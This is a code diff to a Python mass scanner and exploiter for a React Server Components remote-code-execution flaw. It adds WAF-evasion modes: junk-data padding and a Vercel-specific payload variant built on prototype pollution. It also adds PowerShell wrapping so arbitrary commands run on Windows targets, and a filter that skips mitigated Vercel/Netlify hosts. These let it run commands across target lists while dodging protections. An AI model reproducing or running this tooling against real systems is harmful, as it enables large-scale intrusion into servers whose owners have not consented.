@@ -48,6 +48,9 @@ except ImportError:
     print("Install it with: pip3 install requests")
     sys.exit(1)
 
+import random
+import string
+
 
 # Unicode fallback symbols for Windows compatibility
 def _get_unicode_char(char: str, fallback: str) -> str:
@@ -98,6 +101,64 @@ class Colors:
         Colors.BOLD = ''
         Colors.UNDERLINE = ''
         Colors.RESET = ''
+
+
+# Utility Functions for Advanced Features
+def generate_junk_data(size_kb: int = 128) -> Tuple[str, str]:
+    """Generate random junk data for WAF bypass"""
+    param_name = ''.join(random.choices(string.ascii_lowercase, k=12))
+    junk = ''.join(random.choices(string.ascii_letters + string.digits, k=size_kb * 1024))
+    return param_name, junk
+
+
+def resolve_redirects(url: str, session: requests.Session, timeout: int = 10, max_redirects: int = 10) -> str:
+    """Follow same-host redirects only, return final URL"""
+    current_url = url
+    original_host = urlparse(url).netloc
+    
+    for _ in range(max_redirects):
+        try:
+            response = session.head(
+                current_url,
+                timeout=timeout,
+                allow_redirects=False
+            )
+            
+            if response.status_code in (301, 302, 303, 307, 308):
+                location = response.headers.get('Location')
+                if location:
+                    if location.startswith('/'):
+                        # Relative redirect - same host
+                        parsed = urlparse(current_url)
+                        current_url = f"{parsed.scheme}://{parsed.netloc}{location}"
+                    else:
+                        # Absolute redirect - check if same host
+                        new_host = urlparse(location).netloc
+                        if new_host == original_host:
+                            current_url = location
+                        else:
+                            # Different host, stop following
+                            break
+                else:
+                    break
+            else:
+                break
+        except Exception:
+            break
+    
+    return current_url
+
+
+def is_mitigated_host(response: requests.Response) -> bool:
+    """Check if host has Vercel/Netlify mitigations in place"""
+    server_header = response.headers.get('Server', '').lower()
+    has_netlify_vary = 'Netlify-Vary' in response.headers
+    
+    return (
+        has_netlify_vary or
+        server_header == 'netlify' or
+        server_header == 'vercel'
+    )
 
 
 @dataclass
@@ -220,9 +281,16 @@ class ScanStateManager:
 class RscScanner:
     """High-performance RSC vulnerability scanner"""
     
-    def __init__(self, timeout: int = 10, maxWorkers: int = 10):
+    def __init__(self, timeout: int = 10, maxWorkers: int = 10, wafBypass: bool = False, 
+                 wafBypassSize: int = 128, windowsMode: bool = False, vercelWafBypass: bool = False,
+                 followRedirects: bool = True):
         self.timeout = timeout
         self.maxWorkers = maxWorkers
+        self.wafBypass = wafBypass
+        self.wafBypassSize = wafBypassSize
+        self.windowsMode = windowsMode
+        self.vercelWafBypass = vercelWafBypass
+        self.followRedirects = followRedirects
         self.session = self._createSession()
         
     def _createSession(self) -> requests.Session:
@@ -258,8 +326,16 @@ class RscScanner:
         activeDetected = False
         endpointVulnerable = False
         error = None
+        finalUrl = url
         
         try:
+            # Follow redirects if enabled
+            if self.followRedirects:
+                finalUrl = resolve_redirects(url, self.session, self.timeout)
+                if finalUrl != url:
+                    details.append(f"Followed redirect: {url} -> {finalUrl}")
+                    url = finalUrl
+            
             # Passive scan
             passiveDetected, passiveDetails = self._passiveScan(url)
             details.extend(passiveDetails)
@@ -283,7 +359,7 @@ class RscScanner:
         vulnerable = (passiveDetected or activeDetected or endpointVulnerable) and not error
         
         return ScanResult(
-            url=url,
+            url=finalUrl,
             vulnerable=vulnerable,
             passiveDetected=passiveDetected,
             activeDetected=activeDetected,
@@ -303,6 +379,12 @@ class RscScanner:
             contentType = response.headers.get('Content-Type', '')
             html = response.text[:100000]  # Limit to first 100KB for performance
             headers = response.headers
+            
+            # CRITICAL: X-Action-Redirect header check (definitive RCE proof)
+            xActionRedirect = headers.get('X-Action-Redirect', '')
+            if re.search(r'.*/login\?a=11111.*', xActionRedirect):
+                score += 100
+                details.append(f"X-Action-Redirect RCE proof: {xActionRedirect} (CRITICAL)")
             
             # Primary indicators (high confidence)
             if 'text/x-component' in contentType:
@@ -527,6 +609,11 @@ class RscScanner:
                     timeout=5
                 )
                 
+                # Check for Vercel/Netlify mitigations (filter false positives)
+                if is_mitigated_host(errorResp):
+                    details.append(f"{path} - Mitigated (Vercel/Netlify protection)")
+                    continue
+                
                 # Check if benign probe returned the REACT2SHELL_PROBE marker
                 if 'REACT2SHELL_PROBE' in errorResp.text:
                     details.append(f"REACT2SHELL_PROBE confirmed on {path} (high confidence vulnerability)")
@@ -694,11 +781,25 @@ Examples:
 class MassScanner:
     """Main mass scanning coordinator"""
     
-    def __init__(self, maxWorkers: int = 10, execCommand: str = None):
-        self.scanner = RscScanner(maxWorkers=maxWorkers)
+    def __init__(self, maxWorkers: int = 10, execCommand: str = None, wafBypass: bool = False,
+                 wafBypassSize: int = 128, windowsMode: bool = False, vercelWafBypass: bool = False,
+                 followRedirects: bool = True):
+        self.scanner = RscScanner(
+            maxWorkers=maxWorkers,
+            wafBypass=wafBypass,
+            wafBypassSize=wafBypassSize,
+            windowsMode=windowsMode,
+            vercelWafBypass=vercelWafBypass,
+            followRedirects=followRedirects
+        )
         self.stateManager = ScanStateManager()
         self.maxWorkers = maxWorkers
         self.execCommand = execCommand
+        self.wafBypass = wafBypass
+        self.wafBypassSize = wafBypassSize
+        self.windowsMode = windowsMode
+        self.vercelWafBypass = vercelWafBypass
+        self.followRedirects = followRedirects
         self.paused = False
         self.stopScan = False
         
@@ -826,6 +927,10 @@ class MassScanner:
     def _exploitMethod2(self, target: str, cmd: str) -> Optional[str]:
         """Alternative exploit using __proto__ pollution (based on sumanrox PoC)"""
         try:
+            # Adjust command for Windows if needed
+            if self.windowsMode:
+                cmd = f'powershell -c "{cmd}"'
+            
             # More reliable payload using prototype pollution
             # This captures command output via Error digest
             craftedChunk = {
@@ -841,10 +946,29 @@ class MassScanner:
                 },
             }
             
-            files = {
-                "0": (None, json.dumps(craftedChunk)),
-                "1": (None, '"$@0"'),
-            }
+            # Build multipart form data with optional WAF bypass
+            if self.wafBypass:
+                # Add junk data at the beginning
+                param_name, junk_data = generate_junk_data(self.wafBypassSize)
+                files = {
+                    param_name: (None, junk_data),
+                    "0": (None, json.dumps(craftedChunk)),
+                    "1": (None, '"$@0"'),
+                }
+            elif self.vercelWafBypass:
+                # Vercel-specific WAF bypass with alternative structure
+                craftedChunk["_response"]["_formData"]["get"] = '$3:\\"$$:constructor:constructor'
+                files = {
+                    "0": (None, json.dumps(craftedChunk)),
+                    "1": (None, '"$@0"'),
+                    "2": (None, "[]"),
+                    "3": (None, '{"\\"\u0024\u0024":{}}'),
+                }
+            else:
+                files = {
+                    "0": (None, json.dumps(craftedChunk)),
+                    "1": (None, '"$@0"'),
+                }
             
             headers = {"Next-Action": "x"}
             
@@ -857,7 +981,7 @@ class MassScanner:
                         url,
                         files=files,
                         headers=headers,
-                        timeout=10
+                        timeout=self.timeout if not self.wafBypass else 20
                     )
                     
                     # Extract output from digest field in error response
@@ -1122,6 +1246,12 @@ def main():
   {Colors.GREEN}Resume & Reports:{Colors.RESET}
     {Colors.CYAN}%(prog)s --resume{Colors.RESET}
     {Colors.CYAN}%(prog)s targets.txt -o custom-report.txt{Colors.RESET}
+  
+  {Colors.GREEN}Advanced Features:{Colors.RESET}
+    {Colors.CYAN}%(prog)s targets.txt --waf-bypass{Colors.RESET}
+    {Colors.CYAN}%(prog)s --url https://example.com --windows{Colors.RESET}
+    {Colors.CYAN}%(prog)s targets.txt --vercel-waf-bypass --threads 20{Colors.RESET}
+    {Colors.CYAN}%(prog)s --url https://example.com --no-follow-redirects{Colors.RESET}
 
 {Colors.CYAN}{Colors.BOLD}INPUT FILE FORMAT:{Colors.RESET}
   {Colors.YELLOW}# Comments start with #{Colors.RESET}
@@ -1144,6 +1274,16 @@ def main():
   {Colors.MAGENTA}{bullet}{Colors.RESET} Active: RSC headers, endpoint probing
   {Colors.MAGENTA}{bullet}{Colors.RESET} Error-based: REACT2SHELL_PROBE marker detection
   {Colors.MAGENTA}{bullet}{Colors.RESET} Fingerprint: __NEXT_DATA__, x-middleware-rewrite
+  {Colors.MAGENTA}{bullet}{Colors.RESET} RCE Proof: X-Action-Redirect header analysis
+  {Colors.MAGENTA}{bullet}{Colors.RESET} Mitigation Filter: Vercel/Netlify protection detection
+
+{Colors.CYAN}{Colors.BOLD}ADVANCED FEATURES:{Colors.RESET}
+  {Colors.GREEN}--waf-bypass{Colors.RESET}           Prepend junk data to evade WAF inspection
+  {Colors.GREEN}--waf-bypass-size KB{Colors.RESET}   Customize junk data size (default: 128KB)
+  {Colors.GREEN}--windows{Colors.RESET}              Use PowerShell payloads for Windows targets
+  {Colors.GREEN}--vercel-waf-bypass{Colors.RESET}    Vercel-specific WAF bypass payload
+  {Colors.GREEN}--follow-redirects{Colors.RESET}     Follow same-host redirects (default: on)
+  {Colors.GREEN}--no-follow-redirects{Colors.RESET}  Disable redirect following
   
 {Colors.CYAN}{Colors.BOLD}OUTPUT FILES:{Colors.RESET}
   {Colors.YELLOW}scan_state.json{Colors.RESET}     Resume state & full results (JSON)
@@ -1210,6 +1350,43 @@ def main():
         metavar="N",
         help="Number of concurrent worker threads (default: 10, recommended: 10-20)"
     )
+    scan_group.add_argument(
+        "--follow-redirects",
+        action="store_true",
+        default=True,
+        help="Follow same-host redirects (default: enabled)"
+    )
+    scan_group.add_argument(
+        "--no-follow-redirects",
+        action="store_false",
+        dest="follow_redirects",
+        help="Disable redirect following"
+    )
+    
+    # Advanced options
+    advanced_group = parser.add_argument_group('Advanced Options')
+    advanced_group.add_argument(
+        "--waf-bypass",
+        action="store_true",
+        help="Enable WAF bypass mode (prepend junk data to requests)"
+    )
+    advanced_group.add_argument(
+        "--waf-bypass-size",
+        type=int,
+        default=128,
+        metavar="KB",
+        help="Size of junk data for WAF bypass in KB (default: 128)"
+    )
+    advanced_group.add_argument(
+        "--windows",
+        action="store_true",
+        help="Use Windows PowerShell payloads instead of Unix shell"
+    )
+    advanced_group.add_argument(
+        "--vercel-waf-bypass",
+        action="store_true",
+        help="Use Vercel-specific WAF bypass payload variant"
+    )
     
     # Exploitation options
     exploit_group = parser.add_argument_group('Exploitation Options')
@@ -1240,8 +1417,33 @@ def main():
         parser.print_help()
         sys.exit(1)
     
+    # Auto-increase timeout for WAF bypass mode
+    timeout = 20 if args.waf_bypass else 10
+    
+    # Print configuration if advanced features are used
+    if args.waf_bypass or args.windows or args.vercel_waf_bypass or not args.follow_redirects:
+        print(f"\n{Colors.CYAN}{Colors.BOLD}Advanced Configuration:{Colors.RESET}")
+        if args.waf_bypass:
+            print(f"  {Colors.GREEN}{check}{Colors.RESET} WAF Bypass: Enabled ({args.waf_bypass_size}KB junk data)")
+            print(f"  {Colors.GREEN}{check}{Colors.RESET} Timeout: {timeout}s (auto-increased)")
+        if args.vercel_waf_bypass:
+            print(f"  {Colors.GREEN}{check}{Colors.RESET} Vercel WAF Bypass: Enabled")
+        if args.windows:
+            print(f"  {Colors.GREEN}{check}{Colors.RESET} Windows Mode: PowerShell payloads")
+        if not args.follow_redirects:
+            print(f"  {Colors.YELLOW}{warn}{Colors.RESET} Redirect Following: Disabled")
+        print()
+    
     try:
-        scanner = MassScanner(maxWorkers=args.threads, execCommand=args.execCommand)
+        scanner = MassScanner(
+            maxWorkers=args.threads,
+            execCommand=args.execCommand,
+            wafBypass=args.waf_bypass,
+            wafBypassSize=args.waf_bypass_size,
+            windowsMode=args.windows,
+            vercelWafBypass=args.vercel_waf_bypass,
+            followRedirects=args.follow_redirects
+        )
         
         if args.resume:
             # Resume from saved state
